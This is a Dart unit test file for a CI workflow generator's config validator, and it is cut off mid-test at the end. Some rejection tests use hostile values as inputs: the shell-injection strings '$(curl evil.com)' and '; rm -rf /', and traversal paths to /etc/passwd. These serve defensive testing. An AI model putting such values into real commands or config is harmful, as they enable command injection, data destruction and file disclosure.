import 'dart:convert';
import 'dart:io';

import 'package:test/test.dart';
import 'package:yaml/yaml.dart';

import 'package:runtime_ci_tooling/src/cli/utils/workflow_generator.dart';

/// Helper: build a minimal valid CI config map.
Map<String, dynamic> _validConfig({
  String dartSdk = '3.9.2',
  Map<String, dynamic>? features,
  List<String>? platforms,
  Map<String, dynamic>? secrets,
  String? pat,
  dynamic lineLength,
  List<dynamic>? subPackages,
  Map<String, dynamic>? runnerOverrides,
  Map<String, dynamic>? webTest,
}) {
  return <String, dynamic>{
    'dart_sdk': dartSdk,
    'features': features ?? <String, dynamic>{'proto': false, 'lfs': false},
    if (platforms != null) 'platforms': platforms,
    if (secrets != null) 'secrets': secrets,
    if (pat != null) 'personal_access_token_secret': pat,
    if (lineLength != null) 'line_length': lineLength,
    if (subPackages != null) 'sub_packages': subPackages,
    if (runnerOverrides != null) 'runner_overrides': runnerOverrides,
    if (webTest != null) 'web_test': webTest,
  };
}

void main() {
  // ===========================================================================
  // P0: validate() tests
  // ===========================================================================
  group('WorkflowGenerator.validate()', () {
    // ---- dart_sdk ----
    group('dart_sdk', () {
      test('missing dart_sdk produces error', () {
        final errors = WorkflowGenerator.validate({
          'features': <String, dynamic>{},
        });
        expect(errors, contains('ci.dart_sdk is required'));
      });

      test('null dart_sdk produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': null,
          'features': <String, dynamic>{},
        });
        expect(errors, contains('ci.dart_sdk is required'));
      });

      test('non-string dart_sdk produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': 42,
          'features': <String, dynamic>{},
        });
        expect(errors, anyElement(contains('must be a string')));
      });

      test('empty-string dart_sdk produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': '',
          'features': <String, dynamic>{},
        });
        expect(errors, anyElement(contains('non-empty')));
      });

      test('whitespace-only dart_sdk produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': '  ',
          'features': <String, dynamic>{},
        });
        // After trim the string is empty
        expect(errors, anyElement(contains('non-empty')));
      });

      test('dart_sdk with leading/trailing whitespace produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': ' 3.9.2 ',
          'features': <String, dynamic>{},
        });
        expect(errors, anyElement(contains('whitespace')));
      });

      test('dart_sdk with trailing newline triggers whitespace error', () {
        // A trailing \n makes trimmed != sdk, so the whitespace check fires first.
        final errors = WorkflowGenerator.validate({
          'dart_sdk': '3.9.2\n',
          'features': <String, dynamic>{},
        });
        expect(errors, anyElement(contains('whitespace')));
      });

      test(
        'dart_sdk with embedded tab (after trim is identity) triggers newlines/tabs error',
        () {
          // A tab in the middle: trim() has no effect but the regex catches it.
          final errors = WorkflowGenerator.validate({
            'dart_sdk': '3.9\t.2',
            'features': <String, dynamic>{},
          });
          expect(errors, anyElement(contains('newlines/tabs')));
        },
      );

      test('valid semver dart_sdk passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(dartSdk: '3.9.2'),
        );
        expect(errors.where((e) => e.contains('dart_sdk')), isEmpty);
      });

      test('valid semver with pre-release passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(dartSdk: '3.10.0-beta.1'),
        );
        expect(errors.where((e) => e.contains('dart_sdk')), isEmpty);
      });

      test('channel "stable" passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(dartSdk: 'stable'),
        );
        expect(errors.where((e) => e.contains('dart_sdk')), isEmpty);
      });

      test('channel "beta" passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(dartSdk: 'beta'),
        );
        expect(errors.where((e) => e.contains('dart_sdk')), isEmpty);
      });

      test('channel "dev" passes', () {
        final errors = WorkflowGenerator.validate(_validConfig(dartSdk: 'dev'));
        expect(errors.where((e) => e.contains('dart_sdk')), isEmpty);
      });

      test('invalid dart_sdk like "latest" produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(dartSdk: 'latest'),
        );
        expect(errors, anyElement(contains('channel')));
      });

      test('invalid dart_sdk like "3.9" (not full semver) produces error', () {
        final errors = WorkflowGenerator.validate(_validConfig(dartSdk: '3.9'));
        expect(errors, anyElement(contains('channel')));
      });
    });

    // ---- features ----
    group('features', () {
      test('missing features produces error', () {
        final errors = WorkflowGenerator.validate({'dart_sdk': '3.9.2'});
        expect(errors, contains('ci.features is required'));
      });

      test('non-map features produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': '3.9.2',
          'features': 'not_a_map',
        });
        expect(errors, anyElement(contains('features must be an object')));
      });

      test('features with non-bool value produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': '3.9.2',
          'features': <String, dynamic>{'proto': 'yes'},
        });
        expect(errors, anyElement(contains('must be a bool')));
      });

      test('features with unknown key (typo) produces error', () {
        final errors = WorkflowGenerator.validate({
          'dart_sdk': '3.9.2',
          'features': <String, dynamic>{'prto': true}, // typo of 'proto'
        });
        expect(errors, anyElement(contains('unknown key "prto"')));
      });

      test('all known feature keys pass validation', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            features: {
              'proto': true,
              'lfs': false,
              'format_check': true,
              'analysis_cache': false,
              'managed_analyze': true,
              'managed_test': false,
              'build_runner': true,
              'web_test': true,
            },
          ),
        );
        expect(errors.where((e) => e.contains('features')), isEmpty);
      });

      test('empty features map passes (no keys required)', () {
        final errors = WorkflowGenerator.validate(_validConfig(features: {}));
        expect(errors.where((e) => e.contains('features')), isEmpty);
      });
    });

    // ---- platforms ----
    group('platforms', () {
      test('non-list platforms produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(platforms: null)..['platforms'] = 'ubuntu',
        );
        expect(errors, anyElement(contains('platforms must be an array')));
      });

      test('unknown platform entry produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(platforms: ['ubuntu', 'solaris']),
        );
        expect(errors, anyElement(contains('invalid platform "solaris"')));
      });

      test('non-string platform entry produces error', () {
        final config = _validConfig();
        config['platforms'] = [42];
        final errors = WorkflowGenerator.validate(config);
        expect(errors, anyElement(contains('invalid platform')));
      });

      test('valid single platform passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(platforms: ['ubuntu']),
        );
        expect(errors.where((e) => e.contains('platforms')), isEmpty);
      });

      test('valid multi-platform passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(platforms: ['ubuntu', 'macos', 'windows']),
        );
        expect(errors.where((e) => e.contains('platforms')), isEmpty);
      });

      test('omitted platforms (null) does not produce error', () {
        final errors = WorkflowGenerator.validate(_validConfig());
        expect(errors.where((e) => e.contains('platforms')), isEmpty);
      });
    });

    // ---- secrets ----
    group('secrets', () {
      test('non-map secrets produces error', () {
        final config = _validConfig();
        config['secrets'] = 'not_a_map';
        final errors = WorkflowGenerator.validate(config);
        expect(errors, anyElement(contains('secrets must be an object')));
      });

      test('null secrets is fine (optional)', () {
        final errors = WorkflowGenerator.validate(_validConfig());
        expect(errors.where((e) => e.contains('secrets')), isEmpty);
      });

      test('valid secrets map passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'API_KEY': 'SOME_SECRET'}),
        );
        expect(errors.where((e) => e.contains('secrets')), isEmpty);
      });

      test('secrets key with hyphen produces error (unsafe identifier)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'API-KEY': 'SOME_SECRET'}),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });

      test('secrets key starting with digit produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'1API_KEY': 'SOME_SECRET'}),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });

      test('secrets value with hyphen produces error (unsafe secret name)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'API_KEY': 'SOME-SECRET'}),
        );
        expect(errors, anyElement(contains('safe secret name')));
      });

      test('secrets key and value with underscore pass', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'API_KEY': 'MY_SECRET_NAME'}),
        );
        expect(errors.where((e) => e.contains('secrets')), isEmpty);
      });

      test('secrets key with leading underscore produces error (must start with uppercase letter)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'_API_KEY': 'MY_SECRET'}),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });

      test('secrets key with lowercase produces error (uppercase only)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'api_key': 'MY_SECRET'}),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });

      test('secrets value with lowercase produces error (uppercase only)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(secrets: {'API_KEY': 'my_secret'}),
        );
        expect(errors, anyElement(contains('safe secret name')));
      });
    });

    // ---- personal_access_token_secret ----
    group('personal_access_token_secret', () {
      test('non-string pat produces error', () {
        final config = _validConfig();
        config['personal_access_token_secret'] = 123;
        final errors = WorkflowGenerator.validate(config);
        expect(errors, anyElement(contains('personal_access_token_secret')));
      });

      test('empty pat produces error', () {
        final errors = WorkflowGenerator.validate(_validConfig(pat: ''));
        expect(errors, anyElement(contains('personal_access_token_secret')));
      });

      test('valid pat passes', () {
        final errors = WorkflowGenerator.validate(_validConfig(pat: 'MY_PAT'));
        expect(
          errors.where((e) => e.contains('personal_access_token_secret')),
          isEmpty,
        );
      });

      test('null pat is fine (optional, defaults to GITHUB_TOKEN)', () {
        final errors = WorkflowGenerator.validate(_validConfig());
        expect(
          errors.where((e) => e.contains('personal_access_token_secret')),
          isEmpty,
        );
      });

      test('pat with hyphen produces error (unsafe identifier)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(pat: 'MY-PAT'),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });

      test('pat with special chars produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(pat: r'MY_PAT$'),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });

      test('pat GITHUB_TOKEN passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(pat: 'GITHUB_TOKEN'),
        );
        expect(
          errors.where((e) => e.contains('personal_access_token_secret')),
          isEmpty,
        );
      });

      test('pat with leading underscore produces error (must start with uppercase letter)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(pat: '_MY_PAT'),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });

      test('pat with lowercase produces error (uppercase only)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(pat: 'my_pat'),
        );
        expect(errors, anyElement(contains('safe identifier')));
      });
    });

    // ---- line_length ----
    group('line_length', () {
      test('non-numeric line_length produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: true),
        );
        expect(errors, anyElement(contains('line_length')));
      });

      test('int line_length passes', () {
        final errors = WorkflowGenerator.validate(_validConfig(lineLength: 80));
        expect(errors.where((e) => e.contains('line_length')), isEmpty);
      });

      test('string line_length passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: '120'),
        );
        expect(errors.where((e) => e.contains('line_length')), isEmpty);
      });

      test('null line_length is fine (optional)', () {
        final errors = WorkflowGenerator.validate(_validConfig());
        expect(errors.where((e) => e.contains('line_length')), isEmpty);
      });

      test('string line_length "abc" produces error (must be digits only)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: 'abc'),
        );
        expect(errors, anyElement(contains('digits only')));
      });

      test('string line_length "+120" produces error (digits only, no sign)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: '+120'),
        );
        expect(errors, anyElement(contains('digits only')));
      });

      test('string line_length "-120" produces error (digits only, no sign)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: '-120'),
        );
        expect(errors, anyElement(contains('digits only')));
      });

      test('string line_length with leading/trailing whitespace produces error',
          () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: ' 120 '),
        );
        expect(errors, anyElement(contains('whitespace')));
      });

      test('string line_length with embedded newline produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: '12\n0'),
        );
        expect(errors, anyElement(contains('newlines or control')));
      });

      test('string line_length "0" produces error (out of range)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: '0'),
        );
        expect(errors, anyElement(contains('between 1 and 10000')));
      });

      test('string line_length "10001" produces error (out of range)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: '10001'),
        );
        expect(errors, anyElement(contains('between 1 and 10000')));
      });

      test('int line_length 0 produces error (out of range)', () {
        final errors = WorkflowGenerator.validate(_validConfig(lineLength: 0));
        expect(errors, anyElement(contains('between 1 and 10000')));
      });

      test('int line_length 10001 produces error (out of range)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(lineLength: 10001),
        );
        expect(errors, anyElement(contains('between 1 and 10000')));
      });
    });

    // ---- sub_packages (Issue #9 validation) ----
    group('sub_packages', () {
      test('non-list sub_packages produces error', () {
        final config = _validConfig();
        config['sub_packages'] = 'not_a_list';
        final errors = WorkflowGenerator.validate(config);
        expect(errors, anyElement(contains('sub_packages must be an array')));
      });

      test('sub_packages entry that is not a map produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(subPackages: ['just_a_string']),
        );
        expect(
          errors,
          anyElement(contains('sub_packages entries must be objects')),
        );
      });

      test('sub_packages with missing name produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'path': 'packages/foo'},
            ],
          ),
        );
        expect(errors, anyElement(contains('name must be a non-empty string')));
      });

      test('sub_packages with empty name produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': '', 'path': 'packages/foo'},
            ],
          ),
        );
        expect(errors, anyElement(contains('name must be a non-empty string')));
      });

      test('sub_packages with name containing unsupported characters produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo bar', 'path': 'packages/foo'},
            ],
          ),
        );
        expect(errors, anyElement(contains('name contains unsupported characters')));
      });

      test('sub_packages with missing path produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo'},
            ],
          ),
        );
        expect(errors, anyElement(contains('path must be a non-empty string')));
      });

      test('sub_packages with empty path produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': ''},
            ],
          ),
        );
        expect(errors, anyElement(contains('path must be a non-empty string')));
      });

      test(
        'sub_packages path with directory traversal (..) produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              subPackages: [
                <String, dynamic>{'name': 'foo', 'path': '../../../etc/passwd'},
              ],
            ),
          );
          expect(
            errors,
            anyElement(contains('must not traverse outside the repo')),
          );
        },
      );

      test('sub_packages path with embedded traversal produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': 'packages/../../../etc'},
            ],
          ),
        );
        expect(
          errors,
          anyElement(contains('must not traverse outside the repo')),
        );
      });

      test('sub_packages absolute path produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': '/usr/local/bin'},
            ],
          ),
        );
        expect(errors, anyElement(contains('must be a relative repo path')));
      });

      test('sub_packages path starting with ~ produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': '~/evil'},
            ],
          ),
        );
        expect(errors, anyElement(contains('must be a relative repo path')));
      });

      test('sub_packages path "." (repo root) produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': '.'},
            ],
          ),
        );
        expect(errors, anyElement(contains('must not be repo root')));
      });

      test('sub_packages path starting with "-" produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': '--help'},
            ],
          ),
        );
        expect(errors, anyElement(contains('must not start with "-"')));
      });

      test('sub_packages path with backslashes produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': r'packages\foo'},
            ],
          ),
        );
        expect(errors, anyElement(contains('forward slashes')));
      });

      test('sub_packages path with unsupported characters produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': 'packages/foo bar'},
            ],
          ),
        );
        expect(errors, anyElement(contains('unsupported characters')));
      });

      test(
        'sub_packages path with leading/trailing whitespace produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              subPackages: [
                <String, dynamic>{'name': 'foo', 'path': ' packages/foo '},
              ],
            ),
          );
          expect(errors, anyElement(contains('whitespace')));
        },
      );

      test('sub_packages path with trailing tab triggers whitespace error', () {
        // Trailing \t means trimmed != value, so the whitespace check fires first.
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': 'packages/foo\t'},
            ],
          ),
        );
        expect(errors, anyElement(contains('whitespace')));
      });

      test(
        'sub_packages path with embedded tab triggers newlines/tabs error',
        () {
          // Embedded tab: trim() is identity, so newlines/tabs check catches it.
          final errors = WorkflowGenerator.validate(
            _validConfig(
              subPackages: [
                <String, dynamic>{'name': 'foo', 'path': 'packages/f\too'},
              ],
            ),
          );
          expect(errors, anyElement(contains('newlines/tabs')));
        },
      );

      test('sub_packages duplicate name produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'foo', 'path': 'packages/foo'},
              <String, dynamic>{'name': 'foo', 'path': 'packages/bar'},
            ],
          ),
        );
        expect(errors, anyElement(contains('duplicate name "foo"')));
      });

      test(
        'sub_packages duplicate path (after normalization) produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              subPackages: [
                <String, dynamic>{'name': 'foo', 'path': 'packages/foo'},
                <String, dynamic>{'name': 'bar', 'path': 'packages/./foo'},
              ],
            ),
          );
          expect(errors, anyElement(contains('duplicate path')));
        },
      );

      test('valid sub_packages passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            subPackages: [
              <String, dynamic>{'name': 'core', 'path': 'packages/core'},
              <String, dynamic>{'name': 'api', 'path': 'packages/api'},
            ],
          ),
        );
        expect(errors.where((e) => e.contains('sub_packages')), isEmpty);
      });

      test('null sub_packages is fine (optional)', () {
        final errors = WorkflowGenerator.validate(_validConfig());
        expect(errors.where((e) => e.contains('sub_packages')), isEmpty);
      });
    });

    // ---- runner_overrides ----
    group('runner_overrides', () {
      test('non-map runner_overrides produces error', () {
        final config = _validConfig();
        config['runner_overrides'] = 'invalid';
        final errors = WorkflowGenerator.validate(config);
        expect(
          errors,
          anyElement(contains('runner_overrides must be an object')),
        );
      });

      test('runner_overrides with invalid platform key produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'solaris': 'my-runner'}),
        );
        expect(errors, anyElement(contains('invalid platform key "solaris"')));
      });

      test('runner_overrides with empty string value produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'ubuntu': ''}),
        );
        expect(errors, anyElement(contains('must be a non-empty string')));
      });

      test('runner_overrides value with surrounding whitespace produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'ubuntu': ' custom-runner '}),
        );
        expect(errors, anyElement(contains('leading/trailing whitespace')));
      });

      test('valid runner_overrides passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'ubuntu': 'custom-runner-label'}),
        );
        expect(errors.where((e) => e.contains('runner_overrides')), isEmpty);
      });

      test('runner_overrides value with newline produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'ubuntu': 'runner\nlabel'}),
        );
        expect(errors, anyElement(contains('newlines, control chars')));
      });

      test('runner_overrides value with tab produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'ubuntu': 'runner\tlabel'}),
        );
        expect(errors, anyElement(contains('newlines, control chars')));
      });

      test('runner_overrides value with YAML-injection char produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'ubuntu': 'runner:label'}),
        );
        expect(errors, anyElement(contains('unsafe YAML chars')));
      });

      test('runner_overrides value with dollar sign produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(runnerOverrides: {'ubuntu': r'runner$label'}),
        );
        expect(errors, anyElement(contains('unsafe YAML chars')));
      });

      test('runner_overrides value with hyphen and dot passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            runnerOverrides: {'ubuntu': 'runtime-ubuntu-24.04-x64-256gb'},
          ),
        );
        expect(errors.where((e) => e.contains('runner_overrides')), isEmpty);
      });
    });

    // ---- web_test ----
    group('web_test', () {
      test('non-map web_test produces error', () {
        final config = _validConfig();
        config['web_test'] = 'not_a_map';
        final errors = WorkflowGenerator.validate(config);
        expect(errors, anyElement(contains('web_test must be an object')));
      });

      test('null web_test is fine (optional)', () {
        final errors = WorkflowGenerator.validate(_validConfig());
        expect(errors.where((e) => e.contains('web_test')), isEmpty);
      });

      test('web_test.concurrency non-int produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'concurrency': 'fast'}),
        );
        expect(errors, anyElement(contains('concurrency must be an integer')));
      });

      test('web_test.concurrency zero produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'concurrency': 0}),
        );
        expect(errors, anyElement(contains('between 1 and 32')));
      });

      test('web_test.concurrency negative produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'concurrency': -1}),
        );
        expect(errors, anyElement(contains('between 1 and 32')));
      });

      test('web_test.concurrency exceeds upper bound produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'concurrency': 33}),
        );
        expect(errors, anyElement(contains('between 1 and 32')));
      });

      test('web_test.concurrency double/float produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'concurrency': 3.14}),
        );
        expect(errors, anyElement(contains('concurrency must be an integer')));
      });

      test('web_test.concurrency valid int passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
            webTest: {'concurrency': 4},
          ),
        );
        expect(errors.where((e) => e.contains('web_test')), isEmpty);
      });

      test('web_test.concurrency at upper bound (32) passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'concurrency': 32}),
        );
        expect(errors.where((e) => e.contains('concurrency')), isEmpty);
      });

      test('web_test.concurrency null is fine (defaults to 1)', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: <String, dynamic>{}),
        );
        expect(errors.where((e) => e.contains('concurrency')), isEmpty);
      });

      test('web_test.paths non-list produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'paths': 'not_a_list'}),
        );
        expect(errors, anyElement(contains('paths must be an array')));
      });

      test('web_test.paths with empty string produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': [''],
            },
          ),
        );
        expect(errors, anyElement(contains('must be a non-empty string')));
      });

      test('web_test.paths with absolute path produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['/etc/passwd'],
            },
          ),
        );
        expect(errors, anyElement(contains('must be a relative repo path')));
      });

      test('web_test.paths with traversal produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['../../../etc/passwd'],
            },
          ),
        );
        expect(
          errors,
          anyElement(contains('must not traverse outside the repo')),
        );
      });

      test(
        'web_test.paths with embedded traversal (test/web/../../../etc/passwd) produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              features: {'proto': false, 'lfs': false, 'web_test': true},
              webTest: {
                'paths': ['test/web/../../../etc/passwd'],
              },
            ),
          );
          expect(
            errors,
            anyElement(contains('must not traverse outside the repo')),
          );
        },
      );

      test(
        'web_test.paths with shell metacharacters (\$(curl evil)) produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              webTest: {
                'paths': [r'$(curl evil)'],
              },
            ),
          );
          expect(errors, anyElement(contains('unsupported characters')));
        },
      );

      test(
        'web_test.paths with shell metacharacters (; rm -rf /) produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              webTest: {
                'paths': ['; rm -rf /'],
              },
            ),
          );
          expect(errors, anyElement(contains('unsupported characters')));
        },
      );

      test('web_test.paths with single quote produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ["test/web/foo'bar_test.dart"],
            },
          ),
        );
        expect(errors, anyElement(contains('unsupported characters')));
      });

      test('web_test.paths duplicate (after normalization) produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
            webTest: {
              'paths': ['test/web/foo_test.dart', 'test/web/./foo_test.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('duplicate path')));
      });

      test('web_test.paths with backslashes produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': [r'test\web\foo_test.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('forward slashes')));
      });

      test('web_test.paths with unsupported characters produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['test/web test/foo.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('unsupported characters')));
      });

      test('web_test.paths with leading whitespace produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': [' test/web/foo_test.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('whitespace')));
      });

      test('web_test.paths with tilde produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['~/test/foo.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('must be a relative repo path')));
      });

      test('web_test.paths "." (repo root) produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['.'],
            },
          ),
        );
        expect(errors, anyElement(contains('must not be repo root')));
      });

      test('web_test.paths starting with "-" produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['--help'],
            },
          ),
        );
        expect(errors, anyElement(contains('must not start with "-"')));
      });

      test('web_test.paths with newline produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['test/foo\nbar.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('newlines/tabs')));
      });

      test(
        'web_test.paths with embedded traversal that escapes repo produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              webTest: {
                'paths': ['test/../../../etc/passwd'],
              },
            ),
          );
          expect(
            errors,
            anyElement(contains('must not traverse outside the repo')),
          );
        },
      );

      test('web_test.paths with embedded .. that stays in repo is fine', () {
        // test/web/../../etc/passwd normalizes to etc/passwd (still inside repo)
        final errors = WorkflowGenerator.validate(
          _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
            webTest: {
              'paths': ['test/web/../../etc/passwd'],
            },
          ),
        );
        expect(errors.where((e) => e.contains('traverse')), isEmpty);
      });

      test('web_test.paths with shell metacharacter \$ produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': [r'$(curl evil.com)'],
            },
          ),
        );
        expect(errors, anyElement(contains('unsupported characters')));
      });

      test('web_test.paths with shell metacharacter ; produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['test/foo; rm -rf /'],
            },
          ),
        );
        expect(errors, anyElement(contains('unsupported characters')));
      });

      test('web_test.paths with duplicate paths produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['test/web/foo_test.dart', 'test/web/foo_test.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('duplicate path')));
      });

      test('web_test.paths with duplicate normalized paths produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['test/web/./foo_test.dart', 'test/web/foo_test.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('duplicate path')));
      });

      test('web_test.paths with trailing whitespace produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['test/web/foo_test.dart '],
            },
          ),
        );
        expect(errors, anyElement(contains('whitespace')));
      });

      test('web_test.paths with tab produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            webTest: {
              'paths': ['test/web/\tfoo_test.dart'],
            },
          ),
        );
        expect(errors, anyElement(contains('newlines/tabs')));
      });

      test('valid web_test.paths passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
            webTest: {
              'paths': ['test/web/foo_test.dart', 'test/web/bar_test.dart'],
            },
          ),
        );
        expect(errors.where((e) => e.contains('web_test')), isEmpty);
      });

      test('empty web_test.paths list is fine', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
            webTest: {'paths': <String>[]},
          ),
        );
        expect(errors.where((e) => e.contains('web_test')), isEmpty);
      });

      test('valid full web_test config passes', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
            webTest: {
              'concurrency': 2,
              'paths': ['test/web/'],
            },
          ),
        );
        expect(errors.where((e) => e.contains('web_test')), isEmpty);
      });

      test('web_test with unknown key (typo) produces error', () {
        final errors = WorkflowGenerator.validate(
          _validConfig(webTest: {'concurreny': 2}), // typo: concurreny
        );
        expect(errors, anyElement(contains('unknown key "concurreny"')));
      });

      test(
